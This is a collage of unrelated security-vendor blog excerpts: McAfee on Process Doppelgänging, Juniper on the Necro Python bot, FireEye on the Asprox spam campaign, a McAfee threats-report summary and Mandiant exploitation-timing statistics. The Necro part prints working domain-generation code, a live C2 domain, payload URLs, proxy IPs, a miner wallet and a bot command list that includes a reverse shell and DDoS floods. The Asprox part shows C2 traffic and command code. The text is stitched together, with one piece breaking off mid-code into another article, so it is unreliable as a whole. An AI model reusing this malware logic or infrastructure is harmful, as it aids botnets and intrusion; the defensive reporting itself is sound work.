+  Release of WSS is targeted for the end of May, or the beginning of June, 2018.
+What Is Protected Windows 7 & 8 -> McAfee protection is effective Win 10 RS3 -> McAfee protection is effective Win 10 RS4 -> Microsoft has implemented the same protection as McAfee EnSilo have documented that attempts to exploit Win 10 Pre RS3 results in a Windows crash, “Blue Screen of Death” (BSOD).
+McAfee’s testing confirms Ensilo’s results.
+Users may not see a detection alert with some versions of McAfee products under some versions of Windows.
+McAfee testing indicates that all versions of product under every Windows version listed above are protected.
+1 McAfee thanks McAfee Software Engineer, Alnoor Allidina for the diligence and insight that lead to the Process Dopplegänging protection.
+
+
+In the last week of September 2021, Juniper Threat Labs detected a new activity from Necro Python (a.k.a N3Cr0m0rPh , Freakout, Python.
+IRCBot) that is actively exploiting some services, including a new exploit added to its arsenal.
+This new exploit targets Visual Tools DVR VX16 4.2.28.0 from visual-tools.com (no CVE number is assigned to this vulnerability).
+Successful exploitation will download the bot into the system and install a Monero miner.
+Necro was first discovered in January .
+The threat actor made a move in March and in May, adding new exploits to its arsenal.
+Necro bot is an interesting python bot that has many functions which include the following: Network Sniffer Spreading by exploits Spreading by brute-force Using Domain Generation Algorithm Installing a Windows rootkit Receiving and executing bot commands Participating in DDoS attacks Infecting HTML, JS, PHP files Installing Monero Miner
+The script can run in both Windows and Linux environments.
+The script has its own polymorphic engine to morph itself every execution which can bypass signature-based defenses.
+This works by reading every string in its code and encrypting it using a hardcoded key.
+Necro Python’s polymorphism, before and after Domain Generation Algorithm Necro uses DGA for both its CnC and download server.
+It selects from a list of dynamic DNS services as its domain, e.g., ddns.net and prefixes that with 10-19 random characters.
+E.g., ‘ 3ood3dfcqchro.ddns.net’ The domains are pseudo-randomly generated using a hardcoded seed, 0xFAFFDED00001, and a counter is added until 0xFD (253 in decimal) before the counter is reset to 0.
+The seed controls the domain to be generated.
+  
+In effect, it can generate up to 253 unique domains.
+This seed is different from the previous campaigns.
+For instance, the sample used in the March attack used a different seed, 0x7774DEAD.
+From this list of generated domains, it connects to them one by one to see which one is online.
+During our analysis, the following DGA domain was active: gtmpbeaxruxy[.]myftp.org import random counter=0 while 1: if counter>=0xFD: counter=0 counter+=1 random.seed(a=0xFAFFDED00001 + counter) DGA_DOMAIN=(''.join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randrange(10,19)))).lower()+\".\"+random.choice(['ddns.net', 'ddnsking.com', '3utilities.com', 'bounceme.net', 'freedynamicdns.net', 'freedynamicdns.org', 'gotdns.ch', 'hopto.org', 'myddns.me', 'myftp.biz', 'myftp.org', 'myvnc.com', 'onthewifi.com', 'redirectme.net', 'servebeer.com', 'serveblog.net', 'servecounterstrike.com', 'serveftp.com', 'servegame.com', 'servehalflife.com', 'servehttp.com', 'serveirc.com', 'serveminecraft.net', 'servemp3.com', 'servepics.com', 'servequake.com', 'sytes.net', 'viewdns.net', 'webhop.me', 'zapto.org'])
+Necro Python’s Domain Generation Algorithm Bot Commands Necro connects to the CnC server,  gtmpbeaxruxy.myftp.org, via IRC to receive commands which include the following: Command Function addport add port to the scanner delport remove port from scanner ports send to server the ports currently scanned injectcount send to server the number of files injected reinject launch function to inject to html, php, js, htm files scanner stop or launch scanner sniffer stop or launch sniffer scannetrange scan a range of IPs clearscan empty scanner DB revshell launch a reverse shell shell launch a process using subprocess.
+Popen() killknight kill itself execute executes a file killbyname kill process by name killbypid kill process by pid disable disable exploitation module enable enable exploitation module getip get current IP ram get information about the memory update update this bot visit visit a URL dlexe download and execute a file info get system information repack morph this bot logout logout from the server reconnect reconnect to the server udpflood UDP flood synflood SYN flood tcpflood TCP flood slowloris slowloris DDoS attack httpflood launch httpflood torflood launch DDoS using TOR SOCKS proxies loadamp initialize amplification attack reflect launch DNS reflection attack We have noted a few changes on this bot from the previous version.
+First, it removed the SMB scanner which was observed in the May 2021 attack.
+Second, it changed the url that it injects to script files on the compromised system.
+Previously, it used a hardcoded url, ‘ ublock-referer[.]dev/campaign.js ’ and injects this on the scripts and now it uses the DGA for its url, i.e., ‘DGA_DOMAIN/campaign.js’ .
+As noted in the previous reports, this bot will find HTML, PHP, JS and HTM files in the system and will inject a javascript code in every file.
+This is an attempt for that attacker to not only compromise the server but also clients connecting to it.
+Using a DGA domain to host the javascript makes it more resilient against defenses.
+Necro injects javascript code to html, htm, php and .js files found on the compromised server.
+It uses the DGA domain to host campaign.js Necro injects javascript code to html, htm, php and .js files found on the compromised server.
+It uses the DGA domain to host campaign.js We also noted a change in its TOR Socks proxies.
+When the bot receives the “ torflood ” command, it uses a set of TOR proxies for its DDOS attacks.
+New Tor Proxies [‘107.150.8.170:9051’, ‘95.217.251.233:1080’, ‘5.130.184.36:9999’, ‘83.234.161.187:9999’, ‘185.186.240.37:9119’, ‘5.61.53.57:9500’, ‘23.237.60.122:9051’, ‘185.82.217.167:9051’, ‘78.153.5.183:666’, ‘51.210.202.187:8425’, ‘85.159.44.163:9050’, ‘217.12.221.85:9051’, ‘130.61.153.38:9050’, ‘142.93.143.155:9010’, ‘8.209.253.198:9000’, ‘127.0.0.1:9050’]
+Visual Tools DVR Exploit As noted above, this bot added a new exploit to its arsenal.
+The exploit targets Visual Tools DVR VX16 4.2.28.0.
+A poc for this exploit was made available to the public in July, 2021.
+HTTP request made to attack Visual Tools DVR Aside from the bot, the payload will install a XMRig Monero miner with the following wallet.
+45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH
+The scanner function of the bot scans for the following ports and if available, it launches its attack.
+TARGET_PORTS
+=
+[22, 80, 443, 8081, 8081, 7001]
+Juniper Threat Labs is still seeing this Necromorph exploiting the following vulnerabilities: CVE-2020-15568 – TerraMaster TOS before 4.1.29 CVE-2021-2900 – Genexis PLATINUM 4410 2.1 P4410-V2-1.28 CVE-2020-25494 – Xinuos (formerly SCO) Openserver v5 and v6 CVE-2020-28188 – TerraMaster TOS <=
+4.2.06 CVE-2019-12725 – Zeroshell 3.9.0 Detection Exploits used in this attack are detected by Juniper’s NGFW SRX series.
+HTTP:CGI:BASH-CODE-INJECTION HTTP:
+CTS:TERRAMASTER-TOS-INJCTN HTTP:
+CTS:SCO-OPNSRVR-OS-INJ HTTP:CTS:GENEXIS-PLAT-RCE HTTP:
+CTS:ZEROSHELL-CGI-BIN-RCE Juniper Advanced Threat Prevention Cloud detects this bot as follows: Juniper Advanced Threat Prevention DNS Security also detects the DGA domain.
+Indicators of Compromise Domains: gtmpbeaxruxy[.]myftp.org URLs: http://gtmpbeaxruxy[.]myftp.org/setup.py http://gtmpbeaxruxy[.]myftp.org/setup http://gtmpbeaxruxy[.]myftp.org/xmrig http://gtmpbeaxruxy[.]myftp.org/xmrig1 Files: File Hash File Name Eb4a48a32af138e9444f87c4706e5c03d8dc313fabb7ea88c733ef1be9372899 setup E524bd7789b82df11891cc2c12af1ac0ea41dd0b946e1e04a4246cb36321f82f setup.py 0e537db39a7be5493750b7805e3a97da9e6dd78a0c7fca282a55a0241803d803 xmrig F72babf978d8b86a75e3b34f59d4fc6464dc988720d1574a781347896c2989c7 xmrig1 IP Addresses & ports: 107[.]150.8.170:9051 130[.]61.153.38:9050 142[.]93.143.155:9010 185[.]186.240.37:9119 185[.]82.217.167:9051 217[.]12.221.85:9051 23[.]237.60.122:9051 5[.]130.184.36:9999 5[.]61.53.57:9500 51[.]210.202.187:8425 78[.]153.5.183:666 8[.]209.253.198:9000 83[.]234.161.187:9999 85[.]159.44.163:9050 95[.]217.251.233:1080
+
+
+Executive Summary FireEye Labs has been tracking a recent spike in malicious email detections that we attribute to a campaign that began in 2013.
+While malicious email campaigns are nothing new, this one is significant in that we are observing mass-targeting attackers adopting the malware evasion methods pioneered by the stealthier APT attackers.
+And this is certainly a high-volume business, with anywhere from a few hundred to ten thousand malicious emails sent daily – usually distributing between 50 and 500,000 emails per outbreak.
+Through the FireEye Dynamic Threat Intelligence (DTI) cloud , FireEye Labs discovered that each and every major spike in email blasts brought a change in the attributes of their attack.
+These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection.
+Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses.
+This blog will cover the trends of the campaign, as well as provide a short technical analysis of the payload.
+Campaign Details Figure 1: Attack Architecture
+The campaign first appeared in late December of 2013 and has since been seen in fairly cyclical patterns each month.
+It appears that the threat actors behind this campaign are fairly responsive to published blogs and reports surrounding their malware techniques, tweaking their malware accordingly to continuously try and evade detection with success.
+In late 2013, malware labeled as Kuluoz, the specific spam component of the Asprox botnet, was discovered to be the main payload of what would become the first malicious email campaign.
+Since then, the threat actors have continuously tweaked the malware by changing its hardcoded strings, remote access commands, and encryption keys.
+Previously, Asprox malicious email campaigns targeted various industries in multiple countries and included a URL link in the body.
+The current version of Asprox includes a simple zipped email attachment that contains the malicious payload “exe.”
+Figure 2 below represents a sample message while Figure 3 is an example of the various court-related email headers used in the campaign.
+Figure 2 Email Sample Figure 3 Email Headers Some of the recurring campaign that Asporox used includes themes focused around airline tickets, postal services and license keys.
+In recent months however, the court notice and court request-themed emails appear to be the most successful phishing scheme theme for the campaign.
+The following list contains examples of email subject variations, specifically for the court notice theme: Urgent court notice Notice to Appear in Court Notice of appearance in court Warrant to appear Pretrial notice Court hearing notice Hearing of your case Mandatory court appearance The campaign appeared to increase in volume during the month of May. Figure 4 shows the increase in activity of Asprox compared to other crimewares towards the end of May specifically.
+Figure 5 highlights the regular monthly pattern of overall malicious emails.
+In comparison, Figure 6 is a compilation of all the hits from our analytics.
+Figure 4 Worldwide Crimeware Activity Figure 5
+Overall Asprox Botnet tracking Figure 6 Asprox Botnet Activity Unique Samples These malicious email campaign spikes revealed that FireEye appliances, with the support of DTI cloud, were able to provide a full picture of the campaign (blue), while only a fraction of the emailed malware samples could be detected by various Anti-Virus vendors (yellow).
+Figure 7 FireEye Detection vs. Anti-Virus Detection By the end of May, we observed a big spike on the unique binaries associated with this malicious activity.
+Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29 th .
+That is a 16,000% increase in unique MD5s over the usual malicious email campaign we’d observed.
+Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign.
+Figure 8 Asprox Campaign Unique Sample Tracking Figure 9 Geographical Distribution of the Campaign Figure 10 Distribution of Industries Affected Brief Technical Analysis Figure 11 Attack Architecture Infiltration
+The infiltration phase consists of the victim receiving a phishing email with a zipped attachment containing the malware payload disguised as an Office document.
+Figure 11 is an example of one of the more recent phishing attempts.
+Figure 12 Malware Payload Icon Evasion
+Once the victim executes the malicious payload, it begins to start an svchost.exe process and then injects its code into the newly created process.
+Once loaded into memory, the injected code is then unpacked as a DLL.
+Notice that Asprox uses a hardcoded mutex that can be found in its strings.
+Typical Mutex Generation \"2GVWNQJz1\" Create svchost.exe process Code injection into svchost.exe Entrenchment Once the dll is running in memory it then creates a copy of itself in the following location: %
+LOCALAPPDATA%/[8 CHARACTERS].EXE Example filename: %
+LOCALAPPDATA%\\lwftkkea.exe
+It’s important to note that the process will first check itself in the startup registry key, so a compromised endpoint will have the following registry populated with the executable: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+Exfiltration/Communication
+The malware uses various encryption techniques to communicate with the command and control (C2) nodes.
+The communication uses an RSA (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base Cryptographic Provider while the payloads themselves are RC4 encrypted.
+Each sample uses a default hardcoded public key shown below.
+Default Public Key -----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDCUAUdLJ1rmxx+bAndp+Cz6+5I' Kmgap2hn2df/UiVglAvvg2US9qbk65ixqw3dGN/9O9B30q5RD+xtZ6gl4ChBquqw jwxzGTVqJeexn5RHjtFR9lmJMYIwzoc/kMG8e6C/GaS2FCgY8oBpcESVyT2woV7U 00SNFZ88nyVv33z9+wIDAQAB -----END
+PUBLIC KEY-----
+First Communication Packet Bot ID RC4 Encrypted URL POST /5DBA62A2529A51B506D197253469FA745E7634B4FC
+HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: <host useragent> Host: <host ip>:443 Content-Length: 319 Cache-Control: no-cache <knock><id>5DBA62A247BC1F72B98B545736DEA65A</id><group>0206s</group><src>3</src><transport>0</transport><time>1881051166</time><version>1537</version><status>0</status><debug>none<debug></knock>
+C2 Commands
+In comparison to the campaign at the end of 2013, the current campaign uses one of the newer versions of the Asprox family where threat actors added the command “ear.”
+if ( wcsicmp(Str1, L\"idl\") ) { if ( wcsicmp(Str1, L\"run\") ) { if ( wcsicmp(Str1, L\"rem\") ) { if ( wcsicmp(Str1, L\"ear\") { if ( wcsicmp(Str1, L\"rdl\") ) { if ( wcsicmp(Str1, L\"red\") ) { if ( !By Raj Samani on Dec 18, 2018 The McAfee Advanced Threat Research team today published the McAfee® Labs Threats Report, December 2018.
+In this edition, we highlight the notable investigative research and trends in threats statistics and observations gathered by the McAfee Advanced Threat Research and McAfee Labs teams in Q3 of 2018.
+We are very excited to present to you new insights and a new format in this report.
+We are dedicated to listening to our customers to determine what you find important
+and how we can add value.
+In recent months we have gathered more threat intelligence, correlating and analyzing data to provide more useful insights into what is happening in the evolving threat landscape.
+McAfee is collaborating closely with MITRE Corporation in extending the techniques of its MITRE ATT&CK™ knowledge base, and we now include the model in our report.
+We are always working to refine our process and reports.
+You can expect more from us, and we welcome your feedback.
+As we dissect the threat landscape for Q3, some noticeable statistics jump out of the report.
+  
+In particular, the continued rise in cryptojacking, which has made an unexpected emergence over the course of a year.
+In Q3 the growth of coin miner malware returned to unprecedented levels after a temporary slowdown in Q2.
+Our analysis of recent threats included one notable introduction in a disturbing category.
+In Q3 we saw two new exploit kits: Fallout and Underminer.
+Fallout almost certainly had a bearing on the spread of GandCrab, the leading ransomware.
+Five years ago we published the report “Cybercrime Exposed,” which detailed the rise of cybercrime as a service.
+Exploit kits are the epitome of this economy, affording anyone the opportunity to easily and cheaply enter the digital crime business.
+New malware samples jumped up again in Q3 after a decline during the last two quarters.
+Although the upward trend applies to almost every category, we did measure a decline in new mobile malware samples following three quarters of continual growth.
+This post is only a small snapshot of the comprehensive analysis provided in the December Threats Report.
+We hope you enjoy the new format, and we welcome your feedback.
+
+
+One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk.
+In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations.
+Check out our first post on zero-day vulnerabilities .
+Attackers are in a constant race to exploit newly discovered vulnerabilities before defenders have a chance to respond.
+FireEye
+Mandiant Threat Intelligence research into vulnerabilities exploited in 2018 and 2019 suggests that the majority of exploitation in the wild occurs before patch issuance or within a few days of a patch becoming available.
+Figure 1: Percentage of vulnerabilities exploited at various times in relation to patch release FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities that were either exploited or assigned a CVE number between Q1 2018 to Q3 2019.
+The majority of vulnerabilities were exploited as zero-days – before a patch was available.
+More than a quarter were exploited within one month after the patch date.
+Figure 2 illustrates the number of days between when a patch was made available and the first observed exploitation date for each vulnerability.
+We believe these numbers to be conservative estimates, as we relied on the first reported exploitation of a vulnerability linked to a specific date.
+Frequently, first exploitation dates are not publicly disclosed.
+It is also likely that in some cases exploitation occurred without being discovered before researchers recorded exploitation attached to a certain date.
+Figure 2:
+Time between vulnerability exploitation and patch issuance ­­­ Time Between Disclosure and Patch Release
+The average time between disclosure and patch availability was approximately 9 days.
+This average is slightly inflated by vulnerabilities such as CVE-2019-0863, a Microsoft Windows server vulnerability, which was disclosed in December 2018 and not patched until 5 months later in May 2019.
+The majority of these vulnerabilities, however, were patched quickly after disclosure.
+In 59% of cases, a patch was released on the same day the vulnerability was disclosed.
+These metrics, in combination with the observed swiftness of adversary exploitation activity, highlight the importance of responsible disclosure, as it may provide defenders with the slim window needed to successfully patch vulnerable systems.
+Exploitation After Patch Release While the majority of the observed vulnerabilities were zero-days, 42 percent of vulnerabilities were exploited after a patch had been released.
+For these non-zero-day vulnerabilities, there was a very small window (often only hours or a few days) between when the patch was released and the first observed instance of attacker exploitation.
+Table 1 provides some insight into the race between attackers attempting to exploit vulnerable software and organizations attempting to deploy the patch.
+Time to Exploit for Vulnerabilities First Exploited after a Patch Hours Two vulnerabilities were successfully exploited within hours of a patch release, CVE-2018-2628 and CVE-2018-7602.
+Days 12 percent of vulnerabilities were exploited within the first week following the patch release.
+One Month 15 percent of vulnerabilities were exploited after one week but within one month of patch release.
+Years In multiple cases, such as the first observed exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019, attackers exploited vulnerabilities for which a patch had been made available many years prior.
+Table 1:
+Exploitation timing for patched vulnerabilities ranges from within hours of patch issuance to years after initial disclosure Case Studies We continue to observe espionage and financially motivated groups quickly leveraging publicly disclosed vulnerabilities in their operations.
+The following examples demonstrate the speed with which sophisticated groups are able to incorporate vulnerabilities into their toolsets following public disclosure and the fact that multiple disparate groups have repeatedly leveraged the same vulnerabilities in independent campaigns.
+Successful operations by these types of groups are likely to have a high potential impact.
+Figure 3: Timeline of activity for CVE-2018-15982 CVE-2018-15982:
+A use after free vulnerability in a file package in Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code.
+ 
+This vulnerability was exploited by espionage groups—Russia's APT28 and North Korea's APT37—as well as TEMP.MetaStrike and other financially motivated attackers.
+Figure 4:
+Timeline of activity for CVE-2018-20250 CVE-2018-20250:
+A path traversal vulnerability exists within the ACE format in the archiver tool WinRAR versions 5.61 and earlier that, when exploited, allows an attacker to locally execute arbitrary code.
+This vulnerability was exploited by multiple espionage groups, including Chinese, North Korean, and Russian, groups, as well as Iranian groups APT33 and TEMP.Zagros.
+Figure 5: Timeline of Activity for CVE-2018-4878 CVE-2018-4878:
+A use after free vulnerability exists within the DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code.
+Mandiant Intelligence confirmed that North Korea’s APT37 exploited this vulnerability as a zero-day as early as September 3, 2017.
+Within 8 days of disclosure, we observed Russia’s APT28 also leverage this vulnerability, with financially motivated attackers and North Korea’s TEMP.Hermit also using within approximately a month of disclosure.
+Availability of PoC or Exploit Code The availability of POC or exploit code on its own does not always increase the probability or speed of exploitation.
+However, we believe that POC code likely hastens exploitation attempts for vulnerabilities that do not require user interaction.
+For vulnerabilities that have already been exploited, the subsequent introduction of publicly available exploit or POC code indicates malicious actor interest and makes exploitation accessible to a wider range of attackers.
+There were a number of cases in which certain vulnerabilities were exploited on a large scale within 48 hours of PoC or exploit code availability (Table 2).
+Time Between PoC or Exploit Code Publication and First Observed Potential Exploitation Events Product CVE FireEye Risk Rating 1 day WinRAR CVE-2018-20250 Medium 1 day Drupal CVE-2018-7600
+High 1 day Cisco Adaptive Security Appliance CVE-2018-0296 Medium 2 days Apache Struts CVE-2018-11776 High 2 days Cisco Adaptive Security Appliance CVE-2018-0101 High 2 days
